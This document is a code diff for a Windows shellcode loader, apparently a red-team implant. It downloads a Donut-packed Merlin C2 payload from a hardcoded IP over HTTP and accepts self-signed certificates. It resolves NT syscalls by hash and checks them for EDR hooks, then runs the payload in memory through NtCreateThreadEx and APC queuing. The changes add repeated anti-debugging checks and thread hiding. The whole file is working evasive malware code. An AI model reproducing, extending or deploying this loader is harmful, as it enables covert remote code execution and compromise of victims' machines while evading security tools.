@@ -10,14 +10,16 @@
 #pragma comment(lib, "winhttp.lib")
 //#pragma comment(lib, "ntdll")
 
-unsigned char buf[22148113];
+unsigned char buf[11628628];
 
 
 
+int ChekDebug();
 
 
 
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
+
 void myprintf(const char* pszFormat, ...) {
 	char buf[1024];
 	va_list argList;
@@ -107,11 +109,16 @@ BOOL FitchNtSyscall(IN DWORD dwSysHash, OUT PSYSCALL pNtSys) {
 			return FALSE;
 		}
 	}
+	if (ChekDebug()) {
+		return -1;
+	}
 	if (dwSysHash != NULL) {
 		pNtSys->dwSyscallHash = dwSysHash;
 	}
 	else return FALSE;
-
+	if (ChekDebug()) {
+		return -1;
+	}
 	for (DWORD i = 0; i < Global_NT.dwNumberOfFunctions; i++) {
 		PCHAR pcFnName = (PCHAR)((PBYTE)Global_NT.pModule + Global_NT.pdwArrayOfNames[i]);
 		//printf("\n\n\ncurrent function name : %s \n\n\n " , pcFnName);
@@ -139,7 +146,9 @@ BOOL FitchNtSyscall(IN DWORD dwSysHash, OUT PSYSCALL pNtSys) {
 				break;
 			}
 			//if hooked check the neighborhood to find clean syscall
-
+			if (ChekDebug()) {
+				return -1;
+			}
 			// if hooked ? 
 			if (
 				*((PBYTE)pFunctionAddress) == 0xe9 || *((PBYTE)pFunctionAddress + 3) == 0xe9 || *((PBYTE)pFunctionAddress + 8) == 0xe9 || *((PBYTE)pFunctionAddress + 10) == 0xe9
@@ -230,7 +239,9 @@ BOOL InitSyscakk() {
 		////printf("failed to  initialize ntcreatethread \n ");
 		return FALSE;
 	}
-
+	if (ChekDebug()) {
+		return -1;
+	}
 	if (!FitchNtSyscall(NtCloseHash, &sys_func.NtClose)) {
 		////printf("failed to  initialize ntclose \n ");
 		return FALSE;
@@ -248,7 +259,9 @@ BOOL InitSyscakk() {
 		////printf("failed to  initialize ntquerysysteminfo \n ");
 		return FALSE;
 	}
-
+	if (ChekDebug()) {
+		return FALSE;
+	}
 	if (!FitchNtSyscall(NTQUEUEAPCTHREADHash, &sys_func.NtQueueApcThread)) {
 		////printf("failed to  initialize ntquerysysteminfo \n ");
 		return FALSE;
@@ -293,6 +306,9 @@ VOID SharedSleep(IN ULONG64 uMilliseconds) {
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
 void dl(const wchar_t* host, short port)
 {
+	if (ChekDebug()) {
+		return ;
+	}
 
 	LPCWSTR userAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36";
 	int counter = 0;
@@ -319,7 +335,7 @@ void dl(const wchar_t* host, short port)
 
 	// Create an HTTP request handle.
 	if (hConnect)
-		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/merlin.bin", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/merlin_s1_donut.bin", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
 	// This is for accepting self signed Cert
 	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
@@ -375,7 +391,9 @@ void dl(const wchar_t* host, short port)
 			}
 
 			// Read the Data.
-
+			if (ChekDebug()) {
+				return;
+			}
 			ZeroMemory(pszOutBuffer, dwSize + 1);
 
 			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
@@ -424,7 +442,9 @@ void dl(const wchar_t* host, short port)
 }
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
 VOID Exec() {
-
+	if (ChekDebug()) {
+		return ;
+	}
 	PBYTE exec_mem = NULL; 
 	DWORD dwOldProtection ;
 	HANDLE hThread = NULL;
@@ -433,26 +453,26 @@ VOID Exec() {
 	SIZE_T regionSize = sizeof(buf);
 	//exec_mem = VirtualAlloc(NULL , sizeof(buf) , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
 
-
+	
 	/*
 		Remember to Free this memory 
 		
 	*/
 	SET_SYSCALL(sys_func.NtAllocateVirtualMemory);
-	state = RedroExec((HANDLE)-1, &exec_mem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	state = RedroExec(hProcess, &exec_mem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!exec_mem) {
 		myprintf("faield to allocate 0x%X \n" , state );
 		return;
 	}
 	_memcpy(exec_mem, buf , sizeof(buf));
 	myprintf("wiriten to 0x%p \n" , exec_mem);
-	
+	myprintf("exec_mem is 0x%p \n", exec_mem);
 	PULONG pOldProtect = NULL;
 	//SharedSleep(2 * 1000);
 
-	myprintf("hProcess: 0x%p, Base: 0x%p, RegionSize: %lu, NewProtect: 0x%X\n", hProcess, exec_mem, regionSize, PAGE_EXECUTE_READWRITE);
+	//myprintf("hProcess: 0x%p, Base: 0x%p, RegionSize: %lu, NewProtect: 0x%X\n", hProcess, exec_mem, regionSize, PAGE_EXECUTE_READWRITE);
 	
-	
+	SharedSleep(2 * 1000);
 	myprintf("changed protect\n");
 	//hThread = CreateThread(NULL , 0 ,(LPTHREAD_START_ROUTINE)exec_mem , NULL , 0 , NULL);
 	
@@ -460,6 +480,19 @@ VOID Exec() {
 		TRy thread hijacking with context change ????
 	*/
 
+	// change protect
+	if (ChekDebug()) {
+		return ;
+	}
+	ULONG oldProtectVal;
+	PULONG oldProtect = &oldProtectVal;
+	SET_SYSCALL(sys_func.NtProtectVirtualMemory);
+	if ((state = RedroExec(hProcess, &exec_mem, &regionSize, PAGE_EXECUTE_READ, oldProtect)) != 0x00) {
+		myprintf("protect failed 0x%X \n", state);
+		return FALSE;
+
+	}
+	myprintf("chjanged prot DONE\n");
 
 	SET_SYSCALL(sys_func.NtCreateThreadEx);
 	if ((state = RedroExec(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, exec_mem, NULL, TRUE, NULL, NULL, NULL, NULL)) != 0x00) {
@@ -473,6 +506,15 @@ VOID Exec() {
 		//VirtualFree(exec_mem , 0 , MEM_RELEASE);
 		return;
 	}
+	SharedSleep(2 * 1000);
+	SET_SYSCALL(sys_func.NtQueueApcThread);
+	state = RedroExec(hThread, exec_mem, NULL, NULL, NULL);
+	if (state != 0x00) {
+		//myprintf("failed to queue : 0x%X \n" , state);
+		return FALSE;
+	}
+
+
 	SET_SYSCALL(sys_func.NtSetInformationThread);
 	state = RedroExec(hThread, 0x11, NULL, NULL);
 	if (state != 0x00) {
@@ -480,7 +522,10 @@ VOID Exec() {
 		return ;
 	}
 	SharedSleep(2 * 1000);
-
+	if (ChekDebug()) {
+		return ;
+	}
+	SharedSleep(2 * 1000);
 	SET_SYSCALL(sys_func.NtResumeThread);
 	state = RedroExec(hThread, NULL);
 	if (state != 0x00) {
@@ -488,7 +533,9 @@ VOID Exec() {
 		return ;
 	}
 	myprintf("resume thr done\n");
-
+	
+	
+	
 	SET_SYSCALL(sys_func.NtWaitForSingleObject);
 	if ((state = RedroExec(hThread, FALSE, NULL)) != 0x00) {
 		myprintf("wait for ob failed 0x%X \n", state);
@@ -496,19 +543,28 @@ VOID Exec() {
 
 	}
 	
-	
-
+	// ntwait fails ??? 
+	// 
+	myprintf("break hit \n");
 }	
 
+
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
-int main(int argc, char* argv[])
+
+int main()
 {	
+	if (ChekDebug()) {
+		return -1;
+	}
+	SharedSleep(2 * 1000);
 	InitializeNTCONFIG();
+	SharedSleep(1 * 1000);
 	BOOL isit = InitSyscakk();
 	if (!isit) {
 		myprintf("\nFailed to initialize bokemon \n");
+		return -1;
 	}
-	dl(L"192.168.230.139", (short)8000);
+	dl(L"192.168.90.21", (short)80);
 	Exec();
 	return 0;
 }
